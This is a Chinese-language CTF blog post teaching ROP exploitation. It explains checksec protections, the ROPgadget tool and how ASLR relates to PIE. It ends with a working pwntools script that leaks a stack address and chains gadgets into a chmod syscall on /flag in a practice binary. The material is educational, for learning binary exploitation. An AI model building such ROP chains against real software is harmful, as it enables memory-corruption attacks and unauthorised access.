---
layout: post
tags: [pwn]
title: "ROP 利用手法"
author: wsxk
date: 2025-1-15
comments: true
---

- [0. checksec起手](#0-checksec起手)
- [1. ROP gadgets 搜索](#1-rop-gadgets-搜索)
  - [1.1 ROPgadget](#11-ropgadget)
- [2. ROP 防御绕过技巧](#2-rop-防御绕过技巧)
  - [2.1 ASLR(Address Space Layout Randomization)](#21-aslraddress-space-layout-randomization)
    - [2.1.1 泄露stack地址完成绕过](#211-泄露stack地址完成绕过)

# 0. checksec起手<br>
一般情况下，安装`pwntools`后，就会默认帮你安装`checksec`，这个命令非常好用，主要的功能是帮助你了解程序开启了哪些保护。<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20250112103808.png)
```
Arch: 
程序架构，这里告诉你是x86_64

RELRO(read only relocation): 
设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。

Stack: 
有无canary

NX: 
no-execute，即栈不可执行

PIE(position independent executable): 
位置无关代码

SHSTK: 前提条件，开启CET（CONTROL-FLOW ENFORCEMENT TECHNOLOGY）
shadow stack，当shadow stack开启时，CALL指令会把返回地址同时压入数据栈和影子栈（shadow stack），RET指令会把返回地址同时从数据栈和影子栈取出，并比较。
如果从两个栈中取出的返回地址不匹配，那么就会触发控制保护异常（#CP）

IBT: 前提条件，开启CET（CONTROL-FLOW ENFORCEMENT TECHNOLOGY）
indirect branch tracker,应用于间接跳转（jmp/call指令），如果在间接跳转后的下一条指令不是ENDBR32或ENDBR64，就会触发#CP异常。
并不包括RIP相对跳转、远直接jmp跳转、call相对跳转等，这些都是跳转到固定地址，不存在被篡改的可能，因此IBT并不作用于这种情况

Stripped：是否去了符号 

```
总之，开始ctf之前，起手checksec是常规操作<br>

# 1. ROP gadgets 搜索<br>
工欲善其事，必先利其器<br>
ROP中的gadget，人工搜索不现实，这里列出几个常见的好用的rop gadget搜索工具<br>
## 1.1 ROPgadget<br>
`pwntools`安装好后自带的gadget搜索工具<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20250113192206.png)
通常情况下，`ROPgadget`能满足绝大部分需求<br>


# 2. ROP 防御绕过技巧<br>
## 2.1 ASLR(Address Space Layout Randomization)<br>
ASLR和pie的关联和联系是：<br>
```
pie是一种编译选项，即这个程序是否是位置无关的代码；
aslr是系统选项，对于开启了aslr的系统，在加载程序时，会尝试把程序装载到随机的基地址上

如果：
1、关闭aslr
  程序无论是否有pie，装载基地址不变

2、开启aslr，且值为1
  程序没有pie，程序本身装载基地址不变；除heap外的其他部分（如libc、stack等等）会装载在随机地址
  程序有pie，程序本身装载基地址也会变化

3、开启aslr，且值为2
  程序没有pie，程序本身装载基地址不变；其他部分（如libc、stack、heap等等）会装载在随机地址
  程序有pie，程序本身装载基地址也会变化
```

### 2.1.1 泄露stack地址完成绕过<br>
如果你知道`stack`的地址的话,我们可以**引用 写在栈空间上的数据，完成利用**<br>
```python
from pwn import *
context.log_level = 'debug'

p = process("./babyrop_level4.0")
p.recvuntil(b"[LEAK] Your input buffer is located at: 0x")
stack_addr= int(p.recv(12),16)
print("buffer_addr:",hex(stack_addr))

syscall = 0x0000000000402641
pop_rdi_ret = 0x0000000000402669
pop_rsi_ret = 0x0000000000402671
pop_rdx_ret = 0x000000000040264a
pop_rcx_ret = 0x0000000000402662
pop_rax_ret = 0x0000000000402651
payload = b"/flag\x00".ljust(0x50+8,b"a")+ p64(pop_rdi_ret)+p64(stack_addr)+p64(pop_rsi_ret)+p64(511)+p64(pop_rax_ret)+p64(90)+p64(syscall)
#print(shellcraft.sh())
p.send(payload)
p.interactive()
```